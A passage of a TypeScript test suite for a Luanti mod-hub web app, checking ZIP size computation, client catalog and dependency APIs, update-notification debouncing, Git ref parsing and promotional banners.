      expect(pkgService.packages().find(p => p.id === 'sakel-hub/pixie')?.downloads).toBe(450);

      // Verify open activePackage merged new downloads & score while preserving deep-hydrated desc & readme
      expect(pkgService.activePackage()?.downloads).toBe(450);
      expect(pkgService.activePackage()?.score).toBe(5.0);
      expect(pkgService.activePackage()?.desc).toBe('Deep hydrated long description that must be preserved');
      expect(pkgService.activePackage()?.readme).toBe('# Mystical Pixie README');
    } finally {
      globalThis.fetch = origFetch;
      pkgService.closePackageModal(false);
    }
  });

  it('should compute exact normalized .zip byte sizes via fetchAccurateGitZipSize, pre-warm the shared .zip cache, and prioritize fresh server size over stale hydratedMetaCache', async () => {
    const {
      buildSharedZipCacheKey,
      fetchAccurateGitZipSize,
      getCachedNormalizedZip
    } = await import('../../functions/api/lib/upstream');
    const pkgService = TestBed.inject(PackageService);

    // Build a real valid ZIP archive (~335 bytes) with a top-level GitHub branch folder `pixie-main/init.lua`
    const encoder = new TextEncoder();
    const buildMinimalZip = (files: Array<{ path: string; content: string }>): Uint8Array => {
      const localParts: Uint8Array[] = [];
      const cdParts: Uint8Array[] = [];
      let offset = 0;
      for (const f of files) {
        const nameBytes = encoder.encode(f.path);
        const dataBytes = encoder.encode(f.content);
        const localHeader = new Uint8Array(30 + nameBytes.length + dataBytes.length);
        const lv = new DataView(localHeader.buffer);
        lv.setUint32(0, 0x04034b50, true);
        lv.setUint16(4, 20, true);
        lv.setUint16(6, 0, true);
        lv.setUint16(8, 0, true);
        lv.setUint32(14, 0x12345678, true);
        lv.setUint32(18, dataBytes.length, true);
        lv.setUint32(22, dataBytes.length, true);
        lv.setUint16(26, nameBytes.length, true);
        lv.setUint16(28, 0, true);
        localHeader.set(nameBytes, 30);
        localHeader.set(dataBytes, 30 + nameBytes.length);
        localParts.push(localHeader);

        const cdHeader = new Uint8Array(46 + nameBytes.length);
        const cv = new DataView(cdHeader.buffer);
        cv.setUint32(0, 0x02014b50, true);
        cv.setUint16(4, 20, true);
        cv.setUint16(6, 20, true);
        cv.setUint16(8, 0, true);
        cv.setUint16(10, 0, true);
        cv.setUint32(16, 0x12345678, true);
        cv.setUint32(20, dataBytes.length, true);
        cv.setUint32(24, dataBytes.length, true);
        cv.setUint16(28, nameBytes.length, true);
        cv.setUint32(42, offset, true);
        cdHeader.set(nameBytes, 46);
        cdParts.push(cdHeader);
        offset += localHeader.length;
      }
      const cdSize = cdParts.reduce((s, p) => s + p.length, 0);
      const eocd = new Uint8Array(22);
      const ev = new DataView(eocd.buffer);
      ev.setUint32(0, 0x06054b50, true);
      ev.setUint16(8, files.length, true);
      ev.setUint16(10, files.length, true);
      ev.setUint32(12, cdSize, true);
      ev.setUint32(16, offset, true);

      const out = new Uint8Array(offset + cdSize + 22);
      let pos = 0;
      for (const p of [...localParts, ...cdParts, eocd]) {
        out.set(p, pos);
        pos += p.length;
      }
      return out;
    };

    const sampleZipBytes = buildMinimalZip([
      { path: 'pixie-main/mod.conf', content: 'name = pixie\ntitle = Mystical Pixie Companion\n' },
      { path: 'pixie-main/init.lua', content: '-- Mystical Pixie Companion Lua code\nminetest.register_entity("pixie:fairy", {})\n' }
    ]);

    const origFetch = globalThis.fetch;
    globalThis.fetch = (async (input: any) => {
      const url = typeof input === 'string' ? input : input?.url || '';
      if (url.includes('https://github.com/sakel-hub/pixie/archive/refs/tags/v1.0.0.zip')) {
        return new Response(sampleZipBytes as unknown as BodyInit, {
          status: 200,
          headers: { 'Content-Type': 'application/zip' }
        });
      }
      return new Response('Not Found', { status: 404 });
    }) as typeof fetch;

    try {
      const res = await fetchAccurateGitZipSize('https://github.com/sakel-hub/pixie', 'sakel-hub', 'pixie', {
        tag: 'v1.0.0'
      });
      expect(res).toBeTruthy();
      expect(res?.downloadSize).toBeGreaterThan(100);
      expect(res?.downloadSize).toBeLessThan(1024 * 1024); // Exact KB size, never 18.3 MB!
      expect(res?.fileSize).toBe('1 KB');

      // Verify the normalized .zip was pre-warmed into the shared isolate/Edge cache so client downloads hit at 0ms
      const zipCacheKey = buildSharedZipCacheKey('sakel-hub', 'pixie', 'v1.0.0');
      const preWarmed = await getCachedNormalizedZip(zipCacheKey);
      expect(preWarmed).toBeTruthy();
      expect(preWarmed?.byteLength).toBe(res?.downloadSize);
    } finally {
      globalThis.fetch = origFetch;
    }

    // Verify PackageService.normalizePackage prioritizes fresh server `file_size: '335 KB'` over stale `hydratedMetaCache.download_size` (18.3 MB)
    (pkgService as any).hydratedMetaCache.set('sakel-hub/pixie', {
      download_size: 19188940, // Stale 18.3 MB from old repo.size estimate
      file_size: '18.3 MB'
    });

    const normalizedFromBoot = (pkgService as any).normalizePackage({
      id: 'sakel-hub/pixie',
      author: 'sakel-hub',
      name: 'pixie',
      title: 'Mystical Pixie Companion',
      type: 'mod',
      source: 'git',
      provider: 'github',
      file_size: '335 KB' // Fresh server boot payload with file_size
    });
    expect(normalizedFromBoot.file_size).toBe('335 KB');
    expect(normalizedFromBoot.download_size).toBe(335 * 1024);

    // Also verify updatePackageDownloadSize updates catalog, activePackage, and hydratedMetaCache
    (pkgService as any)._packages.set([normalizedFromBoot]);
    (pkgService as any)._activePackage.set(normalizedFromBoot);
    pkgService.updatePackageDownloadSize(normalizedFromBoot, 343040);
    expect(pkgService.activePackage()?.download_size).toBe(343040);
    expect(pkgService.activePackage()?.file_size).toBe('335 KB');
    expect((pkgService as any).hydratedMetaCache.get('sakel-hub/pixie')?.download_size).toBe(343040);
  });

  it('should optimize in-game Luanti client Content tab catalog (compact payload & fmt=keys) and fast-path pure-Git dependencies without upstream ContentDB 404s', async () => {
    const { onRequestGet: packagesIndexGet } = await import('../../functions/api/packages/index');
    const { onRequestGet: dependenciesGet } = await import(
      '../../functions/api/packages/[author]/[name]/dependencies'
    );

    const mockDb = {
      prepare(sql: string) {
        return {
          bind(..._args: any[]) {
            return {
              async first() {
                if (sql.includes('FROM packages')) {
                  return {
                    id: 'sakel-hub/pixie',
                    author_name: 'sakel-hub',
                    name: 'pixie',
                    title: 'Mystical Pixie Companion',
                    type: 'mod',
                    status: 'active',
                    provider: 'github',
                    repo_url: 'https://github.com/sakel-hub/pixie',
                    dependencies: JSON.stringify(['default', 'x_mobs']),
                    optional_dependencies: JSON.stringify(['awards'])
                  };
                }
                return null;
              },
              async all() {
                if (sql.includes('FROM packages') && !sql.includes("status IN ('flagged'")) {
                  if (/\brelease\b/i.test(sql) && !/\brelease_id\b/i.test(sql)) {
                    throw new Error('D1_ERROR: no such column: release at offset 216');
                  }
                  return {
                    results: [
                      {
                        id: 'sakel-hub/pixie',
                        author_name: 'sakel-hub',
                        name: 'pixie',
                        title: 'Mystical Pixie Companion',
                        type: 'mod',
                        short_desc: 'A mystical fairy companion',
                        status: 'active',
                        provider: 'github',
                        repo_url: 'https://github.com/sakel-hub/pixie',
                        tags: JSON.stringify(['mobs', 'magic']),
                        updated_at: '2026-10-31T10:00:00Z'
                      },
                      {
                        id: 'sakel-hub/x_mobs',
                        author_name: 'sakel-hub',
                        name: 'x_mobs',
                        title: 'X Mobs',
                        type: 'modpack',
                        short_desc: 'Vanilla-friendly mobs modpack for Minetest Game',
                        status: 'active',
                        provider: 'github',
                        repo_url: 'https://github.com/sakel-hub/x_mobs',
                        tags: JSON.stringify(['mobs', 'animals']),
                        updated_at: '2026-11-01T12:00:00Z'
                      }
                    ]
                  };
                }
                return { results: [] };
              },
              async run() {
                return { success: true };
              }
            };
          },
          async all() {
            if (sql.includes('FROM packages') && !sql.includes("status IN ('flagged'")) {
              if (/\brelease\b/i.test(sql) && !/\brelease_id\b/i.test(sql)) {
                throw new Error('D1_ERROR: no such column: release at offset 216');
              }
              return {
                results: [
                  {
                    id: 'sakel-hub/pixie',
                    author_name: 'sakel-hub',
                    name: 'pixie',
                    title: 'Mystical Pixie Companion',
                    type: 'mod',
                    short_desc: 'A mystical fairy companion',
                    status: 'active',
                    provider: 'github',
                    repo_url: 'https://github.com/sakel-hub/pixie',
                    tags: JSON.stringify(['mobs', 'magic']),
                    updated_at: '2026-10-31T10:00:00Z'
                  },
                  {
                    id: 'sakel-hub/x_mobs',
                    author_name: 'sakel-hub',
                    name: 'x_mobs',
                    title: 'X Mobs',
                    type: 'modpack',
                    short_desc: 'Vanilla-friendly mobs modpack for Minetest Game',
                    status: 'active',
                    provider: 'github',
                    repo_url: 'https://github.com/sakel-hub/x_mobs',
                    tags: JSON.stringify(['mobs', 'animals']),
                    updated_at: '2026-11-01T12:00:00Z'
                  }
                ]
              };
            }
            return { results: [] };
          },
          async run() {
            return { success: true };
          }
        };
      }
    };

    const origFetch = globalThis.fetch;
    const upstreamCalledUrls: string[] = [];
    globalThis.fetch = (async (input: any) => {
      const url = typeof input === 'string' ? input : input?.url || '';
      upstreamCalledUrls.push(url);
      if (url.includes('/packages/?fmt=vcs')) {
        return new Response(
          JSON.stringify([
            {
              author: 'Wuzzy',
              name: 'mineclone2',
              title: 'VoxeLibre',
              type: 'game',
              short_description: 'Survival sandbox game',
              release: 29410,
              thumbnail: 'https://cdn.content.luanti.org/uploads/mcl2.jpg?width=500&aspect_ratio=3:2&format=png',
              tags: ['survival', 'sandbox']
            },
            {
              author: 'OldDev',
              name: 'legacy_abandoned_mod',
              title: 'Legacy Abandoned Mod',
              type: 'mod',
              short_description: 'Old mod',
              dev_state: 'DEPRECATED',
              release: 100
            }
          ]),
          { status: 200, headers: { 'Content-Type': 'application/json' } }
        );
      }
      return new Response('Not Found', { status: 404 });
    }) as typeof fetch;

    try {
      // 1. Test non-boot in-game Luanti client catalog request with protocol_version, engine_version & hide=desktop_default
      const clientRes = await packagesIndexGet({
        request: new Request(
          'https://luantihub.org/api/packages/?type=mod&type=game&type=txp&protocol_version=45&engine_version=5.11.0&hide=nonfree&hide=desktop_default&nocache=1'
        ),
        env: { DB: mockDb }
      } as any);
      expect(clientRes.status).toBe(200);
      // Verify non-boot in-game client catalog request NEVER blocks on upstream ContentDB /api/scores/
      expect(upstreamCalledUrls.some(u => u.includes('/scores/'))).toBe(false);
      const clientList = await clientRes.json();
      expect(Array.isArray(clientList)).toBe(true);
      // Deprecated package (`legacy_abandoned_mod`) is filtered out by `hide=desktop_default`
      // Pure-Git packages (`sakel-hub/pixie` type=mod and `sakel-hub/x_mobs` type=modpack normalized to mod) are BOTH returned!
      expect(clientList.length).toBe(3);
      expect(clientList.some((x: any) => x.name === 'legacy_abandoned_mod')).toBe(false);
      // Verify compact ContentDB-compatible fields without redundant web-only bloat (`short_desc`, `tags`, `score`, `downloads`, `license`)
      const pixieItem = clientList.find((x: any) => x.name === 'pixie');
      expect(pixieItem).toBeTruthy();
      expect(pixieItem.author).toBe('sakel-hub');
      expect(pixieItem.short_description).toBe('A mystical fairy companion');
      expect(pixieItem.short_desc).toBeUndefined();
      expect(pixieItem.tags).toBeUndefined();
      expect(typeof pixieItem.release).toBe('number');
      expect(pixieItem.video_thumbnail_url).toBeUndefined();

      const xMobsItem = clientList.find((x: any) => x.name === 'x_mobs');
      expect(xMobsItem).toBeTruthy();
      expect(xMobsItem.author).toBe('sakel-hub');
      expect(xMobsItem.type).toBe('mod');
      expect(xMobsItem.short_description).toBe('Vanilla-friendly mobs modpack for Minetest Game');
      expect(typeof xMobsItem.release).toBe('number');

      // Verify in-game client search query `q=x_mobs` returns `sakel-hub/x_mobs`
      const searchXMobsRes = await packagesIndexGet({
        request: new Request(
          'https://luantihub.org/api/packages/?type=mod&type=game&type=txp&protocol_version=45&engine_version=5.11.0&hide=nonfree&hide=desktop_default&q=x_mobs&nocache=1'
        ),
        env: { DB: mockDb }
      } as any);
      expect(searchXMobsRes.status).toBe(200);
      const searchXMobsList = await searchXMobsRes.json();
      expect(searchXMobsList.length).toBe(1);
      expect(searchXMobsList[0].name).toBe('x_mobs');

      const mcl2Item = clientList.find((x: any) => x.name === 'mineclone2');
      expect(mcl2Item).toBeTruthy();
      // ContentDB thumbnail is formatted as `https://content.luanti.org/thumbnails/1/<file>.png` so Luanti's `screenshots.lua` never 404s on `cdn.content.luanti.org/thumbnails/2/`
      expect(mcl2Item.thumbnail).toBe('https://content.luanti.org/thumbnails/1/mcl2.jpg.png');

      // 2. Test fmt=keys columnar response
      const keysRes = await packagesIndexGet({
        request: new Request('https://luantihub.org/api/packages/?type=mod&fmt=keys&nocache=1'),
        env: { DB: mockDb }
      } as any);
      expect(keysRes.status).toBe(200);
      const keysPayload = await keysRes.json();
      expect(Array.isArray(keysPayload.keys)).toBe(true);
      expect(Array.isArray(keysPayload.pkgs)).toBe(true);
      expect(keysPayload.keys).toContain('author');
      expect(keysPayload.keys).toContain('name');

      // 3. Test pure-Git package dependencies fast-path (must NOT call ContentDB upstream for sakel-hub/pixie)
      upstreamCalledUrls.length = 0;
      const depRes = await dependenciesGet({
        request: new Request('https://luantihub.org/api/packages/sakel-hub/pixie/dependencies/?only_hard=1&nocache=1'),
        params: { author: 'sakel-hub', name: 'pixie' },
        env: { DB: mockDb }
      } as any);
      expect(depRes.status).toBe(200);
      const depData = await depRes.json();
      expect(depData['sakel-hub/pixie']).toBeTruthy();
      // Never queried ContentDB /packages/sakel-hub/pixie/dependencies/!
      expect(upstreamCalledUrls.some(u => u.includes('/packages/sakel-hub/pixie/dependencies'))).toBe(false);
    } finally {
      globalThis.fetch = origFetch;
    }
  });

  it('should not fire false-positive update notifications when release_id is unchanged during D1 updated_at hydration, and should sanitize release notes & abbreviate commit SHAs', async () => {
    const pwaService = TestBed.inject(PwaService);
    const pkgService = TestBed.inject(PackageService);
    const settingsService = TestBed.inject(SettingsService);

    localStorage.removeItem('luanti_known_package_versions_v1');
    localStorage.removeItem('luanti_notified_ids_v1');
    settingsService.notificationsEnabled.set(true);
    settingsService.notifyPackageUpdates.set(true);

    // 1. Seed initial baseline (e.g. boot payload before D1 updated_at hydration)
    const initialBootCatalog = [
      { id: 'TenPlus1/farming', author: 'TenPlus1', name: 'farming', title: 'Farming Redo', type: 'mod', release_id: 39541 },
      { id: 'Wuzzy/mineclone2', author: 'Wuzzy', name: 'mineclone2', title: 'VoxeLibre', type: 'game', release_id: 39534 },
      { id: 'Zughy/soothing32', author: 'Zughy', name: 'soothing32', title: 'Soothing 32', type: 'txp', release_id: 39350 }
    ];
    const seedCount = await pwaService.checkAndNotifyUpdatedPackages(initialBootCatalog);
    expect(seedCount).toBe(0);

    // 2. Subsequent background refresh where D1 cache row hydrated an `updated_at` timestamp,
    //    while `release_id` is identical (39541, 39534, 39350). Must NOT notify!
    const hydratedSameReleaseCatalog = [
      {
        id: 'TenPlus1/farming',
        author: 'TenPlus1',
        name: 'farming',
        title: 'Farming Redo',
        type: 'mod',
        release_id: 39541,
        updated_at: new Date().toISOString()
      },
      {
        id: 'Wuzzy/mineclone2',
        author: 'Wuzzy',
        name: 'mineclone2',
        title: 'VoxeLibre',
        type: 'game',
        release_id: 39534,
        updated_at: new Date().toISOString()
      },
      {
        id: 'Zughy/soothing32',
        author: 'Zughy',
        name: 'soothing32',
        title: 'Soothing 32',
        type: 'txp',
        release_id: 39350,
        updated_at: new Date().toISOString()
      }
    ];
    const falsePositiveCount = await pwaService.checkAndNotifyUpdatedPackages(hydratedSameReleaseCatalog);
    expect(falsePositiveCount).toBe(0);

    // 3. Verify release notes sanitization and 7-char commit SHA abbreviation
    expect(pkgService.sanitizeReleaseNotesText('Git Tag / Release (3.3.2)', '3.3.2')).toBeUndefined();
    expect(pkgService.sanitizeReleaseNotesText('Direct source archive from main branch', 'main')).toBeUndefined();
    expect(pkgService.sanitizeReleaseNotesText('3.3.1', '3.3.1')).toBeUndefined();
    expect(pkgService.sanitizeReleaseNotesText('Added new biome particles and fixed crash.', '3.3.2')).toBe(
      'Added new biome particles and fixed crash.'
    );
    expect(pkgService.abbreviateGitRefLabel('bfa7ea7e76ffe5cbfd41fbeaad91ed3dc53bbe3e')).toBe('bfa7ea7');
    expect(pkgService.abbreviateGitRefLabel('683fa2be0e64b8eb6650f282a52f7aaa5ab53439')).toBe('683fa2b');
    expect(pkgService.abbreviateGitRefLabel('3.3.1')).toBe('3.3.1');

    // 4. Verify Releases tab renders skeleton preloader while releases are being fetched in the background
    //    instead of prematurely flashing "Latest Archive (main)"
    const testPkg = (pkgService as any).normalizePackage({
      id: 'sakel-hub/x_farming',
      author: 'sakel-hub',
      name: 'x_farming',
      title: 'X Farming',
      type: 'mod',
      default_branch: 'main'
    });
    (pkgService as any)._activePackage.set(testPkg);
    const modalFix = TestBed.createComponent(PackageDetailModalComponent);
    const modalComp = modalFix.componentInstance;
    modalComp.package = testPkg;
    modalComp.activeTab.set('releases');
    modalComp.releases.set([]);
    modalComp.isLoadingReleases.set(true);
    modalFix.detectChanges();

    const modalEl = modalFix.nativeElement as HTMLElement;
    expect(modalEl.querySelector('[aria-label="Loading releases"]')).toBeTruthy();
    expect(modalEl.textContent).not.toContain('Latest Archive (main)');

    // Once background loading completes with 0 tagged releases, the default branch archive card is shown
    modalComp.isLoadingReleases.set(false);
    modalFix.detectChanges();
    expect(modalEl.querySelector('[aria-label="Loading releases"]')).toBeNull();
    expect(modalEl.textContent).toContain('Latest Archive (main)');

    // 5. Verify multi-forge Git repository parsing & URL normalization across all supported Git services
    expect(parseGitRepoTarget('https://github.com/luanti-org/luanti/tree/master/builtin')).toEqual({
      provider: 'github',
      host: 'github.com',
      owner: 'luanti-org',
      repo: 'luanti'
    });
    expect(parseGitRepoTarget('https://codeberg.org/Wuzzy/MineClone2/src/branch/master')).toEqual({
      provider: 'codeberg',
      host: 'codeberg.org',
      owner: 'Wuzzy',
      repo: 'MineClone2'
    });
    expect(parseGitRepoTarget('https://notabug.org/TenPlus1/farming.git')).toEqual({
      provider: 'codeberg',
      host: 'codeberg.org',
      owner: 'TenPlus1',
      repo: 'farming'
    });
    expect(parseGitRepoTarget('https://git.minetest.land/MineClone2/MineClone2/releases')).toEqual({
      provider: 'codeberg',
      host: 'git.minetest.land',
      owner: 'MineClone2',
      repo: 'MineClone2'
    });
    expect(parseGitRepoTarget('https://gitlab.com/zughy-friends-minetest/skywars/-/tree/main')).toEqual({
      provider: 'gitlab',
      host: 'gitlab.com',
      owner: 'zughy-friends-minetest',
      repo: 'skywars'
    });
    expect(parseGitRepoTarget('https://framagit.org/org/subgroup/my_mod.git')).toEqual({
      provider: 'gitlab',
      host: 'framagit.org',
      owner: 'org/subgroup',
      repo: 'my_mod'
    });
    expect(parseGitRepoTarget('https://gitea.example.org/modder/custom_mod')).toEqual({
      provider: 'codeberg',
      host: 'gitea.example.org',
      owner: 'modder',
      repo: 'custom_mod'
    });

    const normalizeRepo = (url: string) => (pkgService as any).normalizeGitRepoUrl(url);
    expect(normalizeRepo('https://notabug.org/TenPlus1/mobs_redo.git')).toBe('https://codeberg.org/tenplus1/mobs_redo');
    expect(normalizeRepo('https://gitlab.com/group/sub/mod/-/releases')).toBe('https://gitlab.com/group/sub/mod');
    expect(normalizeRepo('https://git.minetest.land/author/mod/src/branch/main')).toBe('https://git.minetest.land/author/mod');

    // 6. Verify universal Git Smart HTTP wire protocol (`info/refs?service=git-upload-pack`) parser
    const sampleSmartRefs = [
      '001e# service=git-upload-pack',
      '000000f80222de5a9f0c8b112233445566778899aabbccdd HEAD\0multi_ack thin-pack side-band symref=HEAD:refs/heads/main agent=git/2.43.0',
      '003f0222de5a9f0c8b112233445566778899aabbccdd refs/heads/main',
      '003bbba7ea7e76ffe5cbfd41fbeaad91ed3dc53bbe3e refs/tags/3.3.1',
      '003b1111111111111111111111111111111111111111 refs/tags/3.3.2',
      '003e0222de5a9f0c8b112233445566778899aabbccdd refs/tags/3.3.2^{}',
      '0000'
    ].join('\n');
    const parsedSmartRefs = parseGitSmartHttpRefs(sampleSmartRefs);
    expect(parsedSmartRefs.defaultBranch).toBe('main');
    expect(parsedSmartRefs.headSha).toBe('0222de5a9f0c8b112233445566778899aabbccdd');
    expect(parsedSmartRefs.tags.length).toBe(2);
    expect(parsedSmartRefs.tags[0]).toEqual({
      tagName: '3.3.2',
      commitSha: '0222de5a9f0c8b112233445566778899aabbccdd' // Peeled annotated tag commit SHA
    });
    expect(parsedSmartRefs.tags[1]).toEqual({
      tagName: '3.3.1',
      commitSha: 'bba7ea7e76ffe5cbfd41fbeaad91ed3dc53bbe3e'
    });

    // 7. Verify server-side 6h debounce (`syncDebouncedGitVersionStamp`) & client-side 12h per-package cooldown for branch-only commits
    const d1Queries: Array<{ sql: string; args: any[] }> = [];
    const mockGitDb = {
      prepare(sql: string) {
        return {
          bind(...args: any[]) {
            return {
              async run() {
                d1Queries.push({ sql, args });
                return { success: true };
              }
            };
          },
          async run() {
            return { success: true };
          }
        };
      }
    };
    const mockPkgRow: any = {
      id: 'modder/branch_only_mod',
      latest_commit_sha: null,
      updated_at: new Date().toISOString()
    };
    // Initial seed sets latest_commit_sha without bumping updated_at
    const seeded = await syncDebouncedGitVersionStamp(
      mockGitDb,
      mockPkgRow,
      '1111111111111111111111111111111111111111',
      false
    );
    expect(seeded).toBe(false);
    expect(mockPkgRow.latest_commit_sha).toBe('1111111111111111111111111111111111111111');

    // Rapid second commit within 6h debounce window is held back
    const debouncedRapid = await syncDebouncedGitVersionStamp(
      mockGitDb,
      mockPkgRow,
      '2222222222222222222222222222222222222222',
      false
    );
    expect(debouncedRapid).toBe(false);
    expect(mockPkgRow.latest_commit_sha).toBe('1111111111111111111111111111111111111111');

    // Once 6h quiet window has elapsed, the new commit advances both latest_commit_sha and updated_at
    mockPkgRow.updated_at = new Date(Date.now() - 7 * 3600 * 1000).toISOString();
    const advancedAfterDebounce = await syncDebouncedGitVersionStamp(
      mockGitDb,
      mockPkgRow,
      '2222222222222222222222222222222222222222',
      false
    );
    expect(advancedAfterDebounce).toBe(true);
    expect(mockPkgRow.latest_commit_sha).toBe('2222222222222222222222222222222222222222');

    // Verify client-side PwaService branch-only commit notification + 12h per-package cooldown
    localStorage.removeItem('lh_known_package_versions_v1');
    localStorage.removeItem('luantihub_pkg_notify_cooldown_v1');
    const capturedNotifs: any[] = [];
    const origSend = pwaService.sendNativeNotification.bind(pwaService);
    pwaService.sendNativeNotification = async (p: any) => {
      capturedNotifs.push(p);
      return true;
    };
    try {
      const t0 = Date.now();
      // Seed branch-only package
      await pwaService.checkAndNotifyUpdatedPackages([
        {
          id: 'modder/branch_only_mod',
          author: 'modder',
          name: 'branch_only_mod',
          title: 'Branch Only Mod',
          type: 'mod',
          latest_commit_sha: '1111111111111111111111111111111111111111',
          updated_at: new Date(t0 - 2000).toISOString()
        }
      ]);
      expect(capturedNotifs.length).toBe(0);

      // 1st commit update fires notification with abbreviated 7-char SHA (2222222)
      await pwaService.checkAndNotifyUpdatedPackages([
        {
          id: 'modder/branch_only_mod',
          author: 'modder',
          name: 'branch_only_mod',
          title: 'Branch Only Mod',
          type: 'mod',
          latest_commit_sha: '2222222222222222222222222222222222222222',
          updated_at: new Date(t0 - 1000).toISOString()
        }
      ]);
      expect(capturedNotifs.length).toBe(1);
      expect(capturedNotifs[0].body).toContain('(2222222)');

      // 2nd rapid commit within 12h cooldown window is suppressed (no spam!)
      await pwaService.checkAndNotifyUpdatedPackages([
        {
          id: 'modder/branch_only_mod',
          author: 'modder',
          name: 'branch_only_mod',
          title: 'Branch Only Mod',
          type: 'mod',
          latest_commit_sha: '3333333333333333333333333333333333333333',
          updated_at: new Date(t0).toISOString()
        }
      ]);
      expect(capturedNotifs.length).toBe(1);
    } finally {
      pwaService.sendNativeNotification = origSend;
      localStorage.removeItem('luantihub_pkg_notify_cooldown_v1');
    }
  });

  it('should pin active HeroPromotions at Slide #1 in addition to the 6 showcase packages, auto-expire past promotions, support relative/external URLs, notify once when notifyPromotions is enabled, and manage promotions via Admin UI + /api/promotions', async () => {
    const pkgService = TestBed.inject(PackageService);
    const settingsService = TestBed.inject(SettingsService);
    const pwaService = TestBed.inject(PwaService);
    const authService = TestBed.inject(AuthService);

    // 1. Seed 6 organic game packages with banners for the daily showcase
    const sixGames = Array.from({ length: 6 }, (_, i) =>
      (pkgService as any).normalizePackage({
        id: `author/game_${i + 1}`,
        author: 'author',
        name: `game_${i + 1}`,
        title: `Showcase Game ${i + 1}`,
        type: 'game',
        short_desc: `Organic showcase game #${i + 1}`,
        banner: `https://content.luanti.org/uploads/game_${i + 1}.png`,
        downloads: 1000 * (i + 1)
      })
    );
    (pkgService as any)._packages.set(sixGames);

    const nowMs = Date.now();
    const activePromo = {
      id: 'promo-jam-2026',
      title: 'Luanti Game Jam 2026',
      short_desc: 'Submit your voxel game entry before Sunday midnight UTC!',
      banner_url: '/promo.png',
      badge_text: 'EVENT',
      cta_label: 'Submit Entry',
      cta_url: '/submit',
      secondary_cta_label: 'Official Rules',
      secondary_cta_url: 'https://www.luanti.org',
      starts_at: new Date(nowMs - 3600_000).toISOString(),
      expires_at: new Date(nowMs + 86400_000).toISOString(),
      priority: 100
    };
    const expiredPromo = {
      id: 'promo-expired-2025',
      title: 'Old Expired Event',
      short_desc: 'Already ended',
      banner_url: '/old.png',
      badge_text: 'PROMOTED',
      cta_label: 'Learn More',
      cta_url: '/games',
      starts_at: new Date(nowMs - 172800_000).toISOString(),
      expires_at: new Date(nowMs - 3600_000).toISOString(),
      priority: 200
    };
    const futureScheduledPromo = {
      id: 'promo-future-2027',
      title: 'Future Scheduled Event',
      short_desc: 'Starts tomorrow',
      banner_url: '/future.png',
      badge_text: 'UPCOMING',
      cta_label: 'Preview',
      cta_url: '/setup',
      starts_at: new Date(nowMs + 86400_000).toISOString(),
      expires_at: new Date(nowMs + 172800_000).toISOString(),
      priority: 300
    };

    pkgService.setPromotions([activePromo, expiredPromo, futureScheduledPromo]);

    // Only activePromo is currently within [starts_at, expires_at)
    expect(pkgService.activePromotions().length).toBe(1);
    expect(pkgService.activePromotions()[0].id).toBe('promo-jam-2026');

    // Hero showcase has 1 promotional slide at index 0 + 6 organic showcase slides = 7 slides total
    const heroList = pkgService.heroShowcasePackages();
    expect(heroList.length).toBe(7);
    expect(heroList[0].id).toBe('promo:promo-jam-2026');
    expect(heroList[0]._promo?.badge_text).toBe('EVENT');
    expect(heroList[0].banner).toBe('/promo.png');

    // 2. Verify HeroBillboardComponent renders Slide #1 with custom badge, hides package ratings/downloads, and handles relative vs external CTA URLs
    const heroFixture = TestBed.createComponent(HeroBillboardComponent);
    const heroComp = heroFixture.componentInstance;
    heroFixture.detectChanges();

    expect(heroComp.currentIndex()).toBe(0);
    expect(heroComp.currentPkg()?._promo?.id).toBe('promo-jam-2026');
    expect(heroComp.isInternalPromoUrl('/submit')).toBe(true);
    expect(heroComp.isInternalPromoUrl('/?tag=mapgen')).toBe(true);
    expect(heroComp.isInternalPromoUrl(`${window.location.origin}/package/mt-mods/i3`)).toBe(true);
    expect(heroComp.isInternalPromoUrl('https://forum.luanti.org/viewtopic.php?t=1')).toBe(false);

    const heroEl = heroFixture.nativeElement as HTMLElement;
    expect(heroEl.textContent).toContain('EVENT');
    expect(heroEl.textContent).toContain('Luanti Game Jam 2026');
    expect(heroEl.textContent).toContain('Submit Entry');
    expect(heroEl.textContent).toContain('Official Rules');

    // 3. Verify PwaService.checkAndNotifyPromotions() respects notifyPromotions toggle and deduplicates via lh_seen_promotions_v1
    localStorage.removeItem('lh_seen_promotions_v1');
    const promoNotifs: any[] = [];
    const origSendNotif = pwaService.sendNativeNotification.bind(pwaService);
    pwaService.sendNativeNotification = async (payload: any) => {
      promoNotifs.push(payload);
      return true;
    };
    try {
      settingsService.notificationsEnabled.set(true);
      settingsService.notifyPromotions.set(false);
      await pwaService.checkAndNotifyPromotions([activePromo]);
      expect(promoNotifs.length).toBe(0);

      // Enable notifyPromotions -> fires once with banner image and ctaUrl
      settingsService.notifyPromotions.set(true);
      await pwaService.checkAndNotifyPromotions([activePromo]);
      expect(promoNotifs.length).toBe(1);
      expect(promoNotifs[0].category).toBe('promotion');
      expect(promoNotifs[0].title).toContain('EVENT');
      expect(promoNotifs[0].title).toContain('Luanti Game Jam 2026');
      expect(promoNotifs[0].image).toBe('/promo.png');
      expect(promoNotifs[0].data?.ctaUrl).toBe('/submit');

      // Second call for the same promotion ID is deduplicated
      await pwaService.checkAndNotifyPromotions([activePromo]);
      expect(promoNotifs.length).toBe(1);
    } finally {
      pwaService.sendNativeNotification = origSendNotif;
      localStorage.removeItem('lh_seen_promotions_v1');
    }

    // 4. Verify Admin ProfileDrawerComponent Promotions tab + datetime-local UI pickers + quick duration presets
    (authService as any)._currentUser.set({
      id: 'admin-1',
      username: 'sakel-hub',
      display_name: 'SaKeL',
      avatar_url: 'logo.svg',
      role: 'admin',
      identities: [{ provider: 'github', username: 'sakel-hub', verified: true }],
      packages: []
    });
    (authService as any)._isProfileDrawerOpen.set(true);

    const drawerFixture = TestBed.createComponent(ProfileDrawerComponent);
    const drawerComp = drawerFixture.componentInstance;
    drawerComp.activeTab.set('promotions');
    drawerFixture.detectChanges();

    const drawerEl = drawerFixture.nativeElement as HTMLElement;
    expect(drawerEl.textContent).toContain('Promotions');
    // Collapsed by default to save vertical real estate
    expect(drawerComp.showPromoForm()).toBe(false);
    expect(drawerEl.querySelectorAll('input[type="datetime-local"]').length).toBe(0);

    // Expanding the Create Promotional Campaign panel reveals the form controls
    const toggleBtn = drawerEl.querySelector('[data-testid="promo-form-toggle"]') as HTMLElement;
    expect(toggleBtn).toBeTruthy();
    toggleBtn.click();
    drawerFixture.detectChanges();
    expect(drawerComp.showPromoForm()).toBe(true);
    const datePickers = drawerEl.querySelectorAll('input[type="datetime-local"]');
    expect(datePickers.length).toBe(2);

    drawerComp.promoStartsAtLocal = '2026-11-01T12:00';
    drawerComp.setPromoPresetDays(7);
    expect(drawerComp.promoExpiresAtLocal).toBe('2026-11-08T12:00');

